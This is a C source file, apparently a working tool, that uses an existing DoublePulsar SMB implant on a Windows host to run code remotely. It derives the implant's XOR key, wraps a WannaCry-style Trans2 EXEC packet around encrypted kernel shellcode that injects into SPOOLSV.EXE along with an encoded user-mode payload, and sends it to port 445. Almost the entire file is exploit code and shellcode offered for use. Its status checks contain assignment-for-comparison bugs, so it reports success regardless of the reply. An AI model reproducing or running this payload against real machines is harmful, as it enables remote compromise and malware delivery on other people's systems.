#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

//Fixed Trans2 session setup PING packet.  This should work
unsigned char trans2_request[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] =
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */

unsigned int LE2INT(unsigned char* data)
{
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
}

void convert_name(char* out, char* name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

int xor_payload(unsigned int xor_key, unsigned char* buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while (i < size);
	return 0;
}

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

uint32_t ror(uint32_t dword, int bits) {
	return (dword >> bits) | (dword << (32 - bits));
}

uint32_t generate_process_hash(const char* process) {
	uint32_t proc_hash = 0;
	size_t len = strlen(process);
	char* proc = (char*)malloc(len + 2);
	strcpy(proc, process);
	proc[len] = '\0';

	for (size_t i = 0; i <= len; i++) {
		proc_hash = ror(proc_hash, 13);
		proc_hash += (unsigned char)proc[i];
	}

	free(proc);
	return proc_hash;
}

const char* calculate_doublepulsar_arch(uint64_t s) {
	if ((s & 0xffffffff00000000) == 0) {
		return "x86 (32-bit)";
	}
	else {
		return "x64 (64-bit)";
	}
}


int kernel_shellcode_size = 0;
int shellcode_one_part_len = 0;
int shellcode_part_two_len = 0;
int userland_shellcode_size = 0;
unsigned char hMem[4096];

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);

	//output windows version to the screen
	printf("Remote OS: ");
	int r;
	for (r = 0; r < 39; r++) {
		printf("%c", recvbuff[44 + r]);
	}
	printf("\n");

	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char* ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$",argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	//Update treeID, UserID
	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
	//might need to update processid

	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x51 or 81
	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	unsigned char signature[5];
	unsigned int sig;
	//copy SMB signature from recvbuff to local buffer
	signature[0] = recvbuff[18];
	signature[1] = recvbuff[19];
	signature[2] = recvbuff[20];
	signature[3] = recvbuff[21];
	signature[4] = '\0';
	//this is for determining architecture
	//recvbuff[22];
	//but unused at this time

	//convert the signature buffer to unsigned integer 
	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
	sig = LE2INT(signature);

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	// Extract 8 bytes from offset 18
	uint64_t arch_signature_long = 0;
	memcpy(&arch_signature_long, recvbuff + 18, 8);
	const char* arch = calculate_doublepulsar_arch(arch_signature_long);
	printf("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s\n", arch);


	const char* proc_name = "SPOOLSV.EXE";
	uint32_t hash = generate_process_hash(proc_name);
	printf("Process Hash for %s: 0x%08X\n", proc_name, hash);

	uint32_t proc_hash = generate_process_hash(proc_name);

	//Length: 780 bytes
	unsigned char shellcode[] =
		"\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
		"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3"
		"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04"
		"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49"
		"\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8"
		"\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb"
		"\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77"
		"\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6"
		"\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89"
		"\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00"
		"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00"
		"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01"
		"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9";

	unsigned char shellcode_part_two[] =
		"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9"
		"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10"
		"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0"
		"\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a"
		"\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00"
		"\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03"
		"\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48"
		"\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51"
		"\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09"
		"\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b"
		"\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02"
		"\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49"
		"\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8"
		"\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6"
		"\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49"
		"\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8"
		"\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41"
		"\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22"
		"\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d"
		"\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41"
		"\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac"
		"\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75"
		"\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
		"\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9"
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1"
		"\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b"
		"\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
		"\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff"
		"\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66"
		"\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
		"\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56"
		"\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92"
		"\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05"
		"\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8"
		"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3";

	unsigned char ring3[] = 
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x1d\xab\xfd\x0e\xd7\x3a\xd2\x27\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xe3\x7e"
		"\xea\x27\xd2\x12\x27\x1d\xab\xbc\x5f\x96\x6a\x80\x76\x4b"
		"\xe3\xcc\xdc\xb2\x72\x59\x75\x7d\xe3\x76\x5c\xcf\x72\x59"
		"\x75\x3d\xe3\x76\x7c\x87\x72\xdd\x90\x57\xe1\xb0\x3f\x1e"
		"\x72\xe3\xe7\xb1\x97\x9c\x72\xd5\x16\xf2\x66\xdc\x62\xf0"
		"\x4f\xd6\xfb\x30\xca\x4f\xea\xac\x46\x5c\x68\xf2\xac\x5f"
		"\x97\xb5\x0f\x07\xb1\x52\xaf\x1d\xab\xfd\x46\x52\xfa\xa6"
		"\x40\x55\xaa\x2d\x5e\x5c\x72\xca\x63\x96\xeb\xdd\x47\xd6"
		"\xea\x31\x71\x55\x54\x34\x4f\x5c\x0e\x5a\x6f\x1c\x7d\xb0"
		"\x3f\x1e\x72\xe3\xe7\xb1\xea\x3c\xc7\xda\x7b\xd3\xe6\x25"
		"\x4b\x88\xff\x9b\x39\x9e\x03\x15\xee\xc4\xdf\xa2\xe2\x8a"
		"\x63\x96\xeb\xd9\x47\xd6\xea\xb4\x66\x96\xa7\xb5\x4a\x5c"
		"\x7a\xce\x6e\x1c\x7b\xbc\x85\xd3\xb2\x9a\x26\xcd\xea\xa5"
		"\x4f\x8f\x64\x8b\x7d\x5c\xf3\xbc\x57\x96\x60\x9a\xa4\xf1"
		"\x8b\xbc\x5c\x28\xda\x8a\x66\x44\xf1\xb5\x85\xc5\xd3\x85"
		"\xd8\xe2\x54\xa0\x46\x6d\x3b\xd2\x27\x1d\xab\xfd\x0e\xd7"
		"\x72\x5f\xaa\x1c\xaa\xfd\x0e\x96\x80\xe3\xac\x72\x2c\x02"
		"\xdb\x6c\xca\x67\x85\x4b\xea\x47\xa8\x42\x87\x4f\xd8\xc8"
		"\xe3\x7e\xca\xff\x06\xd4\x5b\x17\x2b\x06\xee\xa2\x3f\x69"
		"\x60\x0e\xd9\x92\x64\xd7\x63\x93\xae\xc7\x54\x28\x6d\xb6"
		"\x56\xb1\x09\x78\xd3\x98\x0e\xd7\x3a\xd2\x27";


	size_t ring3_len = sizeof(ring3) / sizeof(ring3[0]);
	ring3_len -= 1;
	printf("ring3 payload len:  %d\n", ring3_len);

	shellcode_one_part_len = sizeof(shellcode) / sizeof(shellcode[0]);
	shellcode_one_part_len -= 1; //remove NULL terminator

	shellcode_part_two_len = sizeof(shellcode_part_two) / sizeof(shellcode_part_two[0]);
	shellcode_part_two_len -= 1; //remove NULL terminator

	kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4;

	printf("Total size of kernel shellcode:  %d\n", kernel_shellcode_size);

	memset(hMem, 0x90, 4096);
	memcpy(hMem, shellcode, shellcode_one_part_len);
	memcpy(hMem + shellcode_one_part_len, &proc_hash, sizeof(proc_hash));
	memcpy(hMem + shellcode_one_part_len + sizeof(proc_hash), shellcode_part_two, shellcode_part_two_len);

	memcpy(hMem + kernel_shellcode_size, &ring3_len, sizeof(uint16_t));
	memcpy(hMem + kernel_shellcode_size + sizeof(uint16_t), ring3, ring3_len);

	//hexDump(NULL, hMem, shellcode_one_part_len + 4);


	//might need to make this static due to sizeof being garbage @ counting shellcode
	//unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
	//unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);

	//remove the NULL terminator count
	//kernel_shellcode_size -= 1;
	//payload_shellcode_size -= 1;

	//unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;
	//add +2 to the entire shellcode size because the size of the shellcode MUST be appended to the total length
	unsigned int EntireShellcodeSize = 4096;

	//generate the SESSION_SETUP parameters here
	unsigned int TotalSizeOfPayload = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
	unsigned int ChunkSize = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
	unsigned int OffsetofChunkinPayload = 0x0000;
	unsigned char Parametersbuffer[13];
	memset(Parametersbuffer, 0x00, 12);
	memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
	memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
	memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
	hexDump(NULL, Parametersbuffer, 12);

	unsigned char byte_xor_key[4];
	byte_xor_key[0] = (unsigned char)XorKey;
	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);

	int i;
	for (i = 0; i < 13; i++)
	{
		Parametersbuffer[i] ^= byte_xor_key[i % 4];
	}
	hexDump(NULL, Parametersbuffer, 12);

	//allocate memory for encrypted shellcode payload buffer
	unsigned char* encrypted = (unsigned char*)malloc(EntireShellcodeSize);

	//initialize to 0
	memset((unsigned char*)encrypted, 0x00, EntireShellcodeSize);

	memcpy((unsigned char*)encrypted, (unsigned char*)hMem, 4096);

	//calculate the payload shellcode length
	//unsigned short dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);

	//remove the NULL terminator from the shellcode count
	//dwPayloadShellcodeSize -= 1;

	//copy kernel shellcode to encrypted buffer
	//memcpy((unsigned char*)encrypted, (unsigned char*)kernel_shellcode, kernel_shellcode_size);

	//hexDump(NULL, encrypted, kernel_shellcode_size);

	//copy the shellcode size after the kernel shellcode
	//memcpy((unsigned char*)encrypted + kernel_shellcode_size, (unsigned char*)&dwPayloadShellcodeSize, 2);

	//hexDump(NULL, encrypted, kernel_shellcode_size + 2);

	//copy payload shellcode to encrypted buffer
	//memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (unsigned char*)shellcode, payload_shellcode_size);

	//hexDump(NULL, encrypted, kernel_shellcode_size + 2 + payload_shellcode_size);

	for (i = 0; i < 4096; i++)
	{
		encrypted[i] ^= byte_xor_key[i % 4];
	}
	//hexDump(NULL, encrypted, EntireShellcodeSize);
	//xor_payload(XorKey, (unsigned char*)encrypted, 4096);

	//allocate memory for the big packet
	unsigned char* big_packet = (unsigned char*)malloc(EntireShellcodeSize + 12 + 70);
	memset((unsigned char*)big_packet, 0x00, EntireShellcodeSize + 12 + 70);

	//copy wannacry skeleton packet to big Trans2 packet
	memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);

	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
	memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);

	//copy encrypted payload
	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, EntireShellcodeSize);

	//Update treeID, UserID
	memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
	memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);

	//patch other values
	unsigned short TotalDataCount = 4096;
	unsigned short DataCount = 4096;
	unsigned short ByteCount = 4096 + 12;

	*(WORD*)(big_packet + 0x27) = TotalDataCount;
	*(WORD*)(big_packet + 0x3b) = DataCount;
	*(WORD*)(big_packet + 0x43) = ByteCount;

	//memcpy((unsigned char*)big_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
	//memcpy((unsigned char*)big_packet + 0x3b, (unsigned char*)&DataCount, 2);
	//memcpy((unsigned char*)big_packet + 0x43, (unsigned char*)&byteCount, 2);

	//patch SMB length
	unsigned short smb_length = 4096 + 12 + 70 - 4;
	printf("NetBIOS value of the SMB Length:  %hu\n", smb_length);

	unsigned short smb_htons_len = htons(EntireShellcodeSize + 12 + 70 - 4);
	memcpy((unsigned char*)big_packet + 2, (unsigned char*)&smb_htons_len, 2);

	int size_big_packet = 4096 + 82;
	printf("TOTAL Size of packet = %d\nThis value is +4 the NetBIOS value length\n", size_big_packet);

	//hexDump(NULL, big_packet, EntireShellcodeSize + 12 + 70);

	unsigned char* pExeBuffer = (unsigned char*)malloc(size_big_packet);
	//PBYTE pExeBuffer = new BYTE[size_big_packet];
	memcpy(pExeBuffer, big_packet, size_big_packet);
	//pExeBuffer[size_big_packet] = '\0';
	//hexDump(NULL, pExeBuffer, EntireShellcodeSize + 12 + 70);
	//delete pExeBuffer;

	//send the payload
	send(sock, (char*)pExeBuffer, size_big_packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//DoublePulsar response: STATUS_NOT_IMPLEMENTED
	if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
	{
		printf("DoublePulsar returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!\n");
	}

	if (recvbuff[34] = 0x52)
	{
		printf("Doublepulsar returned: Success!\n");
	}

	else if (recvbuff[34] = 0x62)
	{
		printf("Doublepulsar returned: Invalid parameters!\n");
	}

	else if (recvbuff[34] = 0x72)
	{
		printf("Doublepulsar returned: Allocation failure!\n");
	}

	else {
		printf("Doublepulsar didn't work!\n");
	}

	free(pExeBuffer);

	/* for future use

	//update key values in the packet
	unsigned short smb_length = 4096+70+12;
	printf("SMB Length:  %hu\n", smb_length);
	memcpy((unsigned char*)big_packet + 2, (char*)&smb_length, 2);

	//maybe uint16_t ??
	unsigned short TotalDataCount = 4096;
	unsigned short DataCount = 4096;
	unsigned short byteCount = 4096 + 13;

	*(WORD*)(big_packet + 0x27) = TotalDataCount;
	*(WORD*)(big_packet + 0x3b) = DataCount;
	*(WORD*)(big_packet + 0x43) = byteCount;

	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);

	*/

	free(encrypted);
	free(big_packet);


	unsigned char disconnect_packet[] =
		"\x00\x00\x00\x23\xff\x53\x4d\x42"
		"\x71\x00\x00\x00\x00\x18\x07\xc0"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x08\xff\xfe"
		"\x00\x08\x41\x00\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);

	//send the disconnect packet
	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);


	unsigned char logoff_packet[] =
		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);

	//send the logoff packet
	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	closesocket(sock);
	WSACleanup();
	return 0;
}
